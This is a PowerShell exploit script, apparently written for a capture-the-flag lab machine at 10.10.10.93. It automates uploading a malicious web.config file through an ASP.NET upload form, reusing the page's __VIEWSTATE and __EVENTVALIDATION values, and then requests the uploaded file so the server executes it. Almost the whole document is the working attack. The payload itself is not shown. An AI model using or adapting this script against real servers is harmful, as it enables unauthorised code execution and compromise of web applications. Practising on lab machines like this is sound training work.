$scheme = 'http://'
$hostname = '10.10.10.93'
$path = '/transfer.aspx'
$uri = $scheme + $hostname + $path
$proxy = 'http://127.0.0.1:8080'
$payload = Get-Item "$PSScriptRoot/web.config" # place web.config in the same location as this script

# Get the page containing the input form and store cookies
$get = Invoke-WebRequest $uri -SessionVariable session
# Filter the required form input to send with the files
$viewState = $get.InputFields | Where-Object {$_.Name -eq '__VIEWSTATE'}
$eventValidation = $get.InputFields | Where-Object {$_.Name -eq '__EVENTVALIDATION'}

$headers = @{
	'Content-Type' = 'multipart/form-data'
}

# Create a form hash table to send with the request
$form = @{
	'__VIEWSTATE' = $viewState.Value
	'__EVENTVALIDATION' = $eventValidation.Value
	'btnUpload' = 'Upload'
	'FileUpload1' = $payload
}

# Parameter splatting
$parameters = @{
	Uri = $uri
	WebSession = $session
	Method = 'Post'
	Headers = $headers
	Form = $form
	#Proxy = $proxy
}

try {
	$post = Invoke-WebRequest @parameters -ErrorAction Stop
	Start-Sleep -Milliseconds 500
	$webConfigUri  = $scheme + $hostname + '/UploadedFiles/web.config'
	$loadFile = Invoke-WebRequest $webConfigUri
}
catch {
	throw $_.Exception
}
